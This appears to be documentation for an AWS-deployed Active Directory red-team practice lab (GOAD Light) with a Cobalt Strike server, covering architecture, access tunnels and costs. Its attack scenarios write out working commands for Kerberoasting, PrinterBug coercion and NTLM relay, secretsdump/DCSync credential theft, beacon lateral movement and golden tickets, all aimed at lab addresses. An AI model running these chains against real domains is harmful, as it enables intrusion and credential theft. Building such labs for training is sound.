# GOAD Light - Multi-Domain Lab

## Overview

GOAD Light provides a **multi-domain Active Directory environment** with parent-child trust relationships, offering more realistic attack scenarios than GOAD Mini while maintaining reasonable costs.

## Architecture Components

### Infrastructure

| Component | IP Address | Instance Type | Subnet | Purpose |
|-----------|-----------|---------------|--------|---------|
| **Jumpbox** | 192.168.56.100 | t2.micro | Public (.64/26) | SSH gateway with Elastic IP |
| **DC01 (kingslanding)** | 192.168.56.10 | t2.medium | Private (.0/26) | Root DC - sevenkingdoms.local |
| **DC02 (winterfell)** | 192.168.56.11 | t2.medium | Private (.0/26) | Child DC - north.sevenkingdoms.local |
| **SRV02 (castelblack)** | 192.168.56.22 | t2.medium | Private (.0/26) | Member Server (File/Print/IIS) |
| **Team Server** | 192.168.56.40 | t2.medium | Private (.0/26) | Cobalt Strike server (port 50050) |
| **Attack Box** | 192.168.56.50 | t2.large | Private (.0/26) | Windows Server 2022 with CS Client + tools |

### Domain Structure

```
Forest: sevenkingdoms.local (Root)
├── DC01 kingslanding (sevenkingdoms.local)
└── DC02 winterfell (north.sevenkingdoms.local) ← Child Domain
    └── SRV02 castelblack (Member Server)
```

### Network Architecture

```
GOAD VPC: 192.168.56.0/24
├── Public Subnet: 192.168.56.64/26
│   ├── Jumpbox (.100) — Ubuntu, Elastic IP, SSH gateway
│   ├── Internet Gateway — bidirectional internet for public subnet
│   └── NAT Gateway — outbound-only internet for private subnet
│
└── Private Subnet: 192.168.56.0/26
    ├── DC01 kingslanding (.10) — Win Server 2019, sevenkingdoms.local
    ├── DC02 winterfell (.11) — Win Server 2019, north.sevenkingdoms.local
    ├── SRV02 castelblack (.22) — Win Server 2019, north.sevenkingdoms.local
    ├── Team Server (.40) — Ubuntu, CS port 50050
    └── Attack Box (.50) — Win Server 2022, CS Client + offensive tools
```

**Trust Relationships**: Automated parent-child domain trust between sevenkingdoms.local and north.sevenkingdoms.local.

**Operator access:** the jumpbox is now a **legacy/fallback SSH gateway**. The primary entry point is the AWS-hosted **Dashboard Server**, which lives in its own VPC peered with this GOAD VPC and reaches every instance directly — all CS and RDP tunnels run through the dashboard's EIP.

#### NAT Gateway

The NAT Gateway is **physically deployed in the public subnet** (it needs an Elastic IP and IGW access to function), but it **serves the private subnet**:

1. Private subnet route table points `0.0.0.0/0 → NAT Gateway`
2. When a private instance (e.g., DC01) needs internet access, traffic flows: `DC01 → VPC Router → NAT GW (public subnet) → IGW → Internet`
3. **Inbound connections from the internet cannot reach private instances** — NAT is outbound-only
4. The jumpbox reaches private instances via **internal VPC routing** (not through the NAT)

#### Traffic Flows

| Flow | Path | Purpose |
|------|------|---------|
| Operator → Dashboard Server | SSH key + IP allow-list → Dashboard EIP | Primary entry point (jump host) |
| Dashboard → all GOAD instances | VPC peering (direct routes) | Lab access, CS tunnel, RDP/WinRM |
| Operator → Jumpbox (fallback) | SSH → IGW → Jumpbox (public IP) | Legacy management access |
| Jumpbox → AD VMs (fallback) | Internal VPC routing (direct) | Lab access, RDP/WinRM |
| AD VMs → Internet | Private subnet → NAT GW → IGW | Windows updates, downloads |
| Team Server ↔ Attack Box | Internal VPC routing (CS 50050) | CS client to server |

## Key Features

### 1. Multi-Domain Environment
- **Parent Domain**: sevenkingdoms.local (DC01)
- **Child Domain**: north.sevenkingdoms.local (DC02)
- **Automatic trust configuration** during deployment
- **Realistic enterprise structure** for cross-domain attacks

### 2. Dedicated C2 + Attack Box
- **Team Server** (192.168.56.40) — dedicated Ubuntu instance running CS on port 50050
- **Attack Box** (192.168.56.50) — Windows Server 2022 with CS Client GUI, PowerSploit, VS Code, WSL2, and red team tools
- **Access**: Operator tunnels through the **Dashboard Server** to reach both (jumpbox is a legacy fallback)

### 3. Member Server (SRV02)
- **File shares** for privilege escalation practice
- **IIS web server** for web-based attacks
- **Print server** for PrinterBug coercion attacks
- **SQL Server** (optional) for database attacks

### 3. Advanced Attack Vectors

#### Cross-Domain Attacks
- ✅ **Trust Enumeration** - Map parent-child relationships
- ✅ **Cross-Domain Kerberoasting** - Target SPNs across trusts
- ✅ **SID History Injection** - Domain escalation attacks
- ✅ **Trust Key Extraction** - Forge inter-realm TGTs

#### Coercion Attacks
- ✅ **PrinterBug** (MS-RPRN) - Force authentication
- ✅ **PetitPotam** (MS-EFSRPC) - Coerce NTLM authentication
- ✅ **DFSCoerce** - DFS-based coercion

#### Privilege Escalation
- ✅ **Unconstrained Delegation** - Computer account compromise
- ✅ **Constrained Delegation** - Service account abuse
- ✅ **Resource-Based Constrained Delegation** (RBCD)

## Deployment

### Configuration

```hcl
# terraform.tfvars
deployment_type = "goad-light"
```

### Via Web Application

1. Navigate to **Configuration** page
2. Select **GOAD Lab Type**: "GOAD Light"
3. Review estimated cost: ~$200-250/month
4. Click **Deploy**
5. Monitor progress (deployment takes 45-60 minutes)

### Via Command Line

```bash
cd terraform
terraform apply -var="goad_lab_type=GOAD-Light"
```

## Attack Scenarios

### Scenario 1: Trust Enumeration with BloodHound

```bash
# From jumpbox - collect from both domains
bloodhound-python -d sevenkingdoms.local -u user -p password -ns 192.168.56.10 -c all
bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 192.168.56.11 -c all

# Analyze trust relationships
# BloodHound will show: north.sevenkingdoms.local → sevenkingdoms.local (Parent-Child)
```

### Scenario 2: Cross-Domain Kerberoasting

```bash
# Enumerate SPNs across both domains
GetUserSPNs.py sevenkingdoms.local/user:password -dc-ip 192.168.56.10 -request
GetUserSPNs.py north.sevenkingdoms.local/user:password -dc-ip 192.168.56.11 -request

# Crack tickets offline
hashcat -m 13100 tickets.txt wordlist.txt
```

### Scenario 3: PrinterBug to DC Coercion

```bash
# Force DC02 to authenticate to attacker-controlled machine
python3 printerbug.py north.sevenkingdoms.local/user:password@192.168.56.11 <attacker-ip>

# Capture NTLM hash with Responder/ntlmrelayx
ntlmrelayx.py -t ldap://192.168.56.11 --delegate-access
```

### Scenario 4: Lateral Movement Path

```bash
# 1. Compromise SRV02 (Member Server)
crackmapexec smb 192.168.56.22 -u user -p password -x "whoami"

# 2. Extract credentials from SRV02
secretsdump.py north.sevenkingdoms.local/user:password@192.168.56.22

# 3. Move to DC02 (Child Domain)
wmiexec.py north.sevenkingdoms.local/administrator@192.168.56.11

# 4. Perform DCSync on child domain
secretsdump.py north.sevenkingdoms.local/administrator@192.168.56.11 -just-dc

# 5. Use child domain admin to access parent (DC01)
# Child domain admins can often access parent domain resources
```

### Scenario 5: Cobalt Strike Multi-Domain Campaign

```bash
# 1. Deploy beacon on SRV02
generate → Windows Executable → Save as payload.exe

# 2. Lateral movement to DC02
shell copy \\192.168.56.22\C$\payload.exe \\192.168.56.11\C$\
shell wmic /node:192.168.56.11 process call create C:\payload.exe

# 3. Beacon from DC02 → CS Server on jumpbox

# 4. Perform DCSync from compromised DC
dcsync north.sevenkingdoms.local NORTH\krbtgt

# 5. Create Golden Ticket for child domain
golden_ticket /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator
```

## Access Methods

The **Dashboard Server** (AWS-hosted, own VPC peered with this lab) is the operator entry point and jump host. All tunnels below run THROUGH the dashboard's EIP, which reaches every lab instance directly over VPC peering. The jumpbox remains only as a legacy fallback.

### 1. Dashboard Web UI (Recommended)
```bash
ssh -L 5000:localhost:5000 ubuntu@<dashboard-eip>
# Open http://localhost:5000 — in-browser terminal, topology, CS beacons, Ansible provisioning
```

### 2. Cobalt Strike Client Connection
```bash
# SSH tunnel to Team Server through the Dashboard Server (from operator laptop)
ssh -L 50050:192.168.56.40:50050 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>

# Then connect CS Client to localhost:50050
# Password: [From deployment output]
```

### 3. RDP to Attack Box (via Dashboard tunnel)
```bash
# SSH tunnel for RDP (from operator laptop)
ssh -L 13389:192.168.56.50:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>

# Then RDP to localhost:13389
# User: Administrator | Password: [From deployment output]
```

### 4. RDP to Domain Controllers (via Dashboard tunnel)
```bash
# DC01
ssh -L 3391:192.168.56.10:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
xfreerdp /v:localhost:3391 /u:Administrator /d:sevenkingdoms /p:'password'

# DC02
ssh -L 3392:192.168.56.11:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
xfreerdp /v:localhost:3392 /u:Administrator /d:north /p:'password'
```

### 5. SOCKS Proxy for Tools
```bash
# Open a SOCKS proxy through the Dashboard Server
ssh -D 1080 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>

# Configure proxychains, then use tools through SOCKS proxy
proxychains crackmapexec smb 192.168.56.0/26
```

> **Legacy fallback (jumpbox):** if the Dashboard Server is unavailable, the jumpbox EIP still works as the SSH gateway — swap `<dashboard-eip>` for `<jumpbox-eip>` in any tunnel above, or `ssh -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>` for a direct shell.

## Cost Breakdown

### Monthly Cost Estimate: ~$250-325

| Resource | Type | Quantity | Monthly Cost |
|----------|------|----------|--------------|
| Jumpbox | t2.micro | 1 | ~$8 |
| Domain Controllers | t2.medium | 2 | ~$66 |
| Member Server (SRV02) | t2.medium | 1 | ~$33 |
| Team Server | t2.medium | 1 | ~$33 |
| Attack Box | t2.large | 1 | ~$67 |
| EBS Storage | 100GB (AB) + 30GB x5 | 6 | ~$20 |
| NAT Gateway | Always on | 1 | ~$32 |
| Data Transfer | Minimal | - | ~$10-15 |
| S3/CloudWatch | Storage/Logs | - | ~$5 |
| **Total** | | | **~$250-325** |

### Cost Optimization

#### Option 1: Stop When Not in Use (Saves 70%)
```bash
# Stop all instances
aws ec2 stop-instances --instance-ids <jumpbox> <dc01> <dc02> <srv02>
# Monthly cost drops to ~$50-60 (storage only)

# Start when needed
aws ec2 start-instances --instance-ids <jumpbox> <dc01> <dc02> <srv02>
```

#### Option 2: Scheduled Operations
```bash
# Implement Lambda function for auto-start/stop
# Example: Run only during business hours (40 hours/week)
# Savings: ~75% reduction → $50-75/month
```

#### Option 3: Smaller Instance Types
```hcl
# Use t3.small for non-DC components
goad_server_instance_type = "t3.small"  # Saves ~$15/month per instance
```

## Learning Path

### Week 1: Trust Relationships
- Enumerate parent-child trusts
- Map domain structure with BloodHound
- Identify cross-domain attack paths
- Test trust authentication

### Week 2: Lateral Movement
- SMB authentication attacks
- WMI command execution
- RDP lateral movement
- PowerShell remoting

### Week 3: Privilege Escalation
- Kerberoasting across trusts
- Unconstrained delegation abuse
- RBCD attacks
- GPO abuse

### Week 4: Domain Escalation
- DCSync child domain
- SID History injection
- Trust key extraction
- Parent domain compromise

## Troubleshooting

### Issue: Trust relationship broken
```bash
# Verify trust from jumpbox
nltest /server:192.168.56.11 /trusted_domains

# Test authentication across trust
runas /user:sevenkingdoms\administrator cmd
```

### Issue: Cannot reach SRV02
```bash
# Check network connectivity
ping 192.168.56.22
nmap -p 445,3389 192.168.56.22

# Verify it's domain-joined
nslookup srv02.north.sevenkingdoms.local 192.168.56.11
```

### Issue: BloodHound data incomplete
```bash
# Re-run collection with debug
bloodhound-python -d sevenkingdoms.local -u user -p password -ns 192.168.56.10 -c all --debug

# Check DNS resolution
dig @192.168.56.10 sevenkingdoms.local
dig @192.168.56.11 north.sevenkingdoms.local
```

## Advanced Topics

### 1. Cross-Forest Trust Attacks
While GOAD Light is a single forest, it simulates trust mechanics:
- **SID Filtering**: Understand how it's bypassed
- **Selective Authentication**: Not enabled by default
- **Trust Transitivity**: Child-to-parent is transitive

### 2. Credential Replay Protection
Practice NTLM relay mitigations:
- **SMB Signing**: Some hosts have it enabled
- **LDAP Signing**: Test bypass techniques
- **EPA (Extended Protection for Authentication)**

### 3. Advanced Persistence
- **DCShadow**: Replicate malicious AD changes
- **AdminSDHolder**: Modify protected group membership
- **DSRM Password**: Backdoor domain controller

## Best Practices

### Lab Management
- ✅ **Snapshot before major operations** - Easy rollback
- ✅ **Document your attack chains** - Great for reports
- ✅ **Practice cleanup** - Remove artifacts after attacks
- ✅ **Reset credentials periodically** - Start fresh

### Security
- ✅ **Never expose to public** - Use management IP restrictions
- ✅ **Rotate teamserver password** - Especially if shared
- ✅ **Audit access logs** - Practice detection techniques
- ✅ **Destroy when done** - Don't leave running indefinitely

## Comparison: GOAD Mini vs GOAD Light

| Feature | GOAD Mini | GOAD Light |
|---------|-----------|------------|
| **AD VMs** | 1 DC | 2 DCs + 1 Server |
| **Shared Infra** | Jumpbox + Team Server + Attack Box | Same |
| **Domains** | 1 | 2 (Parent-Child) |
| **Member Servers** | None | 1 (SRV02) |
| **Trust Relationships** | None | Parent-Child |
| **Cross-Domain Attacks** | No | Yes |
| **Cost/Month** | ~$125-175 | ~$250-325 |
| **Complexity** | Beginner | Intermediate |
| **Best For** | Learning basics | Realistic enterprise scenarios |

## References

- [GOAD Light Documentation](https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/)
- [Trust Relationship Attacks](https://adsecurity.org/?p=1588)
- [Cross-Domain Kerberoasting](https://www.harmj0y.net/blog/activedirectory/kerberoasting-without-mimikatz/)
- [PrinterBug Exploitation](https://www.praetorian.com/blog/red-team-printer-bug-abuse/)

## Summary

GOAD Light offers the **perfect balance** between complexity and cost:
- ✅ **Multi-domain environment** with parent-child trust
- ✅ **Member server** for realistic lateral movement
- ✅ **Dedicated Attack Box** with CS Client, PowerSploit, and red team tools
- ✅ **Advanced attack vectors** (coercion, delegation, trusts)
- ✅ **Proper network isolation** — private subnet for lab, public for access only
- ✅ **Moderate cost** (~$250-325/month, or ~$75 with stop/start)
- ✅ **Intermediate difficulty** - ideal after mastering GOAD Mini

Recommended for red teamers ready to practice enterprise-level attacks!
